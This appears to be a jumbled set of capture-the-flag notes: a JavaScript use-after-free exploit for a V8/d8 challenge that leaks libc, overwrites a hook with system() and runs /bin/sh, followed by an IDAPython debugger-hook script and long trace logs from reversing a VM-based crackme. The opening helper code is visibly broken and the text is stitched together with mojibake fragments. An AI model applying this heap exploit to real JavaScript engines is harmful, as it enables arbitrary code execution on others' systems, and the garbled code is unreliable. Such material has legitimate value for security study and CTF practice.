  for(var i = 7; i >= 0; i--) {
    result  {
  let result = new Uint8Array(0x8);
  for(var i = 0; i >= 8n;
  }
  return result;
};
let sb = new Uint8Array(0x4500);
let ss = new Uint8Array(0x4500);
%ArrayBufferDetach(sb.buffer);
ss.set(sb);
let st = new Uint8Array(0x4500);
let libc_leak = u64(ss.slice(8, 16)) - 0x3ebca0n;
console.log("Libc = " + libc_leak.toString(16));
let system = libc_leak + 0x4F440n;
let system_ss = p64(system);
let chunk_ptr = libc_leak + 0x3ED8D0n;
let chunk_ss = p64(chunk_ptr);
let cmd = new Uint8Array([47, 98, 105, 110, 47, 115, 104, 0]);
let vvv = new Uint8Array(0x100); vvv.buffer;
vvv.set(cmd);
let ab = new Uint8Array(0x40); ab.buffer;
let ac = new Uint8Array(0x40); ac.buffer;
%ArrayBufferDetach(ab.buffer);
%ArrayBufferDetach(ac.buffer);
ac.set(chunk_ss);
%SystemBreak();
let ad = new Uint8Array(0x40); ad.buffer;
let ae = new Uint8Array(0x40); ae.buffer;
ae.set(system_ss, 0x18);
%ArrayBufferDetach(vvv.buffer);
while(true) { }
(byte_400798[input - 97] / 4 + 1)
0x24
0x4200009*99
0x420054
Happy Tree
sub_4a0vm_dispatcher
Wow!
log
case 0:
      result = v1 == v2;  // make them equal
from __future__ import print_function
#---------------------------------------------------------------------
# Debug notification hook test
#
# This script start the executable and steps through the first five
# instructions. Each instruction is disassembled after execution.
#
# Original Author: Gergely Erdelyi 
#
# Maintained By: IDAPython Team
#
#---------------------------------------------------------------------
from idaapi import *
import idc_bc695
class MyDbgHook(DBG_Hooks):
    """ Own debug hook class that implementd the callback functions """
    def dbg_process_start(self, pid, tid, ea, name, base, size):
        print("Process started, pid=%d tid=%d name=%s" % (pid, tid, name))
    def dbg_process_exit(self, pid, tid, ea, code):
        print("Process exited pid=%d tid=%d ea=0x%x code=%d" % (pid, tid, ea, 
code))
    def dbg_library_unload(self, pid, tid, ea, info):
        print("Library unloaded: pid=%d tid=%d ea=0x%x info=%s" % (pid, tid, 
ea, info))
        return 0
    def dbg_process_attach(self, pid, tid, ea, name, base, size):
        print("Process attach pid=%d tid=%d ea=0x%x name=%s base=%x size=%x" % 
(pid, tid, ea, name, base, size))
    def dbg_process_detach(self, pid, tid, ea):
        print("Process detached, pid=%d tid=%d ea=0x%x" % (pid, tid, ea))
        return 0
    def dbg_library_load(self, pid, tid, ea, name, base, size):
        print("Library loaded: pid=%d tid=%d name=%s base=%x" % (pid, tid, 
name, base))
    def dbg_bpt(self, tid, ea):
        #print("Break point at 0x%x pid=%d" % (ea, tid))
        # return values:
        #   -1 - to display a breakpoint warning dialog
        #        if the process is suspended.
        #    0 - to never display a breakpoint warning dialog.
        #    1 - to always display a breakpoint warning dialog.
        if ea % 0x1000 == 0x6B5:
            print('switch case ', end='')
            v = idc_bc695.GetRegValue('edx')
            print((v),end=',')
            v1 = idc_bc695.GetRegValue('edi')
            v2 = idc_bc695.GetRegValue('eax')
            print('v1=0x{:x},v2=0x{:x}'.format(v1,v2))
            #continue_process()
        if ea % 0x1000 == 0x6c8:
            print('return result ', end='')
            v = idc_bc695.GetRegValue('eax')
            print(hex(v))
            #continue_process()
        if ea % 0x1000 == 0x6E0:
            v1 = idc_bc695.GetRegValue('edi')
            v2 = idc_bc695.GetRegValue('eax')
            print('if v1('+hex(v1)+')==v2('+hex(v2)+')')
        return 0
    def dbg_suspend_process(self):
        #print("Process suspended")
        pass
    def dbg_exception(self, pid, tid, ea, exc_code, exc_can_cont, exc_ea, 
exc_info):
        print("Exception: pid=%d tid=%d ea=0x%x exc_code=0x%x can_continue=%d 
exc_ea=0x%x exc_info=%s" % (
            pid, tid, ea, exc_code & idaapi.BADADDR, exc_can_cont, exc_ea, 
exc_info))
        # return values:
        #   -1 - to display an exception warning dialog
        #        if the process is suspended.
        #   0  - to never display an exception warning dialog.
        #   1  - to always display an exception warning dialog.
        return 0
    def dbg_trace(self, tid, ea):
        print("Trace tid=%d ea=0x%x" % (tid, ea))
        # return values:
        #   1  - do not log this trace event;
        #   0  - log it
        return 0
    def dbg_step_into(self):
        print("Step into")
        self.dbg_step_over()
    def dbg_run_to(self, pid, tid=0, ea=0):
        print("Runto: tid=%d" % tid)
        idaapi.continue_process()
    def dbg_step_over(self):
        eip = get_reg_value("EIP")
        print("0x%x %s" % (eip, GetDisasm(eip)))
        self.steps += 1
        if self.steps >= 5:
            request_exit_process()
        else:
            request_step_over()
# Remove an existing debug hook
try:
    if debughook:
        print("Removing previous hook ...")
        debughook.unhook()
except:
    pass
# Install the debug hook
debughook = MyDbgHook()
debughook.hook()
debughook.steps = 0
# Stop at the entry point
ep = get_inf_attr(INF_START_IP)
request_run_to(ep)
# Step one instruction
request_step_over()
# Start debugging
run_requests()
input: 1123456789abcdef
if v1(0xd35cb5bfL)==v2(0xa25dc66aL)
if v1(0x4fe9499f)==v2(0xaa0036)
if v1(0xa00571aeL)==v2(0xc64e001aL)
if v1(0xdadb909dL)==v2(0x369d0854)
if v1(0x0)==v2(0xf15bcf8fL)
if v1(0x7f5acc5a)==v2(0x6bbe1965)
if v1(0x0)==v2(0x1966cd91)
if v1(0x7f5acc5a)==v2(0xd4c5fbfdL)
if v1(0x0)==v2(0xb04a9b1bL)
input: 0123456789abcdef
if v1(0x6492aa82)==v2(0xa25dc66aL)
if v1(0x4fe9499f)==v2(0xaa0036)
if v1(0xa00571aeL)==v2(0xc64e001aL)
if v1(0xdadb909dL)==v2(0x369d0854)
if v1(0x0)==v2(0xf15bcf8fL)
if v1(0x7f5acc5a)==v2(0x6bbe1965)
logv1input4bytes9len(input)==36
scanfï¬‚aginputv1v2
handlerv2
v1dwordlog
if v1(0x0)==v2(0x1966cd91)
if v1(0x7f5acc5a)==v2(0xd4c5fbfdL)
if v1(0x0)==v2(0xb04a9b1bL)
input: 0123456789abcdef0123456789abcdef0123
if v1(0x6492aa82)==v2(0xa25dc66aL)
if v1(0x4fe9499f)==v2(0xaa0036)
if v1(0xa00571aeL)==v2(0xc64e001aL)
if v1(0xdadb909dL)==v2(0x369d0854)
if v1(0x6492aa82)==v2(0xf15bcf8fL)
if v1(0x4fe9499f)==v2(0x6bbe1965)
if v1(0xa00571aeL)==v2(0x1966cd91)
if v1(0xdadb909dL)==v2(0xd4c5fbfdL)
if v1(0x6492aa82)==v2(0xb04a9b1bL)
input: flag{56789abcdef0123456789abcdef012}
if v1(0xa25dc66aL)==v2(0xa25dc66aL)
if v1(0x8a8cea8bL)==v2(0xaa0036)
if v1(0xa00571aeL)==v2(0xc64e001aL)
if v1(0xdadb909dL)==v2(0x369d0854)
if v1(0x6492aa82)==v2(0xf15bcf8fL)
if v1(0x4fe9499f)==v2(0x6bbe1965)
if v1(0xa00571aeL)==v2(0x1966cd91)
if v1(0xdadb909dL)==v2(0xd4c5fbfdL)
if v1(0x4936033f)==v2(0xb04a9b1bL)
switch case 9,v1=0x57abfdc0,v2=0x67616c66
return result 0x0
switch case 9,v1=0x57abfdb0,v2=0x0
return result 0x0
switch case 8,v1=0x0,v2=0x186a0
return result 0x1
switch case 1,v1=0x67616c66,v2=0xd
return result 0x2d8cc000
switch case 3,v1=0x67616c66,v2=0x2d8cc000
return result 0x4aedac66
switch case 1,v1=0x67616c66,v2=0xd
return result 0x2d8cc000
switch case 3,v1=0x67616c66,v2=0x2d8cc000
return result 0x4aedac66
switch case 2,v1=0x4aedac66,v2=0x11
return result 0x2576
switch case 3,v1=0x4aedac66,v2=0x2576
return result 0x4aed8910
switch case 1,v1=0x67616c66,v2=0xd
return result 0x2d8cc000
switch case 3,v1=0x67616c66,v2=0x2d8cc000
return result 0x4aedac66
switch case 1,v1=0x67616c66,v2=0xd
return result 0x2d8cc000
switch case 3,v1=0x67616c66,v2=0x2d8cc000
return result 0x4aedac66
switch case 2,v1=0x4aedac66,v2=0x11
return result 0x2576
switch case 3,v1=0x4aedac66,v2=0x2576
return result 0x4aed8910
switch case 1,v1=0x4aed8910,v2=0x5
return result 0x5db12200
switch case 3,v1=0x4aed8910,v2=0x5db12200
return result 0x175cab10
switch case 9,v1=0x57abfdc0,v2=0x175cab10
return result 0x0
switch case 4,v1=0x0,v2=0x1
return result 0x1
switch case 9,v1=0x57abfdb0,v2=0x1
return result 0x0
switch case 8,v1=0x1,v2=0x186a0
return result 0x1
switch case 1,v1=0x175cab10,v2=0xd
return result 0x95620000L
switch case 3,v1=0x175cab10,v2=0x95620000
return result 0x823eab10L
switch case 1,v1=0x175cab10,v2=0xd
return result 0x95620000L
switch case 3,v1=0x175cab10,v2=0x95620000
return result 0x823eab10L
switch case 2,v1=0x823eab10,v2=0x11
return result 0x411f
switch case 3,v1=0x823eab10,v2=0x411f
return result 0x823eea0fL
switch case 1,v1=0x175cab10,v2=0xd
return result 0x95620000L
switch case 3,v1=0x175cab10,v2=0x95620000
return result 0x823eab10L
switch case 1,v1=0x175cab10,v2=0xd
return result 0x95620000L
switch case 3,v1=0x175cab10,v2=0x95620000
return result 0x823eab10L
switch case 2,v1=0x823eab10,v2=0x11
return result 0x411f
switch case 3,v1=0x823eab10,v2=0x411f
return result 0x823eea0fL
switch case 1,v1=0x823eea0f,v2=0x5
return result 0x47dd41e0
switch case 3,v1=0x823eea0f,v2=0x47dd41e0
return result 0xc5e3abefL
switch case 9,v1=0x57abfdc0,v2=0xc5e3abef
return result 0x0
switch case 4,v1=0x1,v2=0x1
return result 0x2
switch case 9,v1=0x57abfdb0,v2=0x2
return result 0x0
switch case 8,v1=0x2,v2=0x186a0
return result 0x1
switch case 1,v1=0xc5e3abef,v2=0xd
return result 0x757de000
switch case 3,v1=0xc5e3abef,v2=0x757de000
return result 0xb09e4befL
switch case 1,v1=0xc5e3abef,v2=0xd
return result 0x757de000
switch case 3,v1=0xc5e3abef,v2=0x757de000
return result 0xb09e4befL
switch case 2,v1=0xb09e4bef,v2=0x11
return result 0x584f
switch case 3,v1=0xb09e4bef,v2=0x584f
return result 0xb09e13a0L
switch case 1,v1=0xc5e3abef,v2=0xd
return result 0x757de000
switch case 3,v1=0xc5e3abef,v2=0x757de000
return result 0xb09e4befL
switch case 1,v1=0xc5e3abef,v2=0xd
return result 0x757de000
switch case 3,v1=0xc5e3abef,v2=0x757de000
return result 0xb09e4befL
switch case 2,v1=0xb09e4bef,v2=0x11
return result 0x584f
switch case 3,v1=0xb09e4bef,v2=0x584f
return result 0xb09e13a0L
switch case 1,v1=0xb09e13a0,v2=0x5
return result 0x13c27400
switch case 3,v1=0xb09e13a0,v2=0x13c27400
return result 0xa35c67a0L
switch case 9,v1=0x57abfdc0,v2=0xa35c67a0
return result 0x0
switch case 4,v1=0x2,v2=0x1
return result 0x3
switch case 9,v1=0x57abfdb0,v2=0x3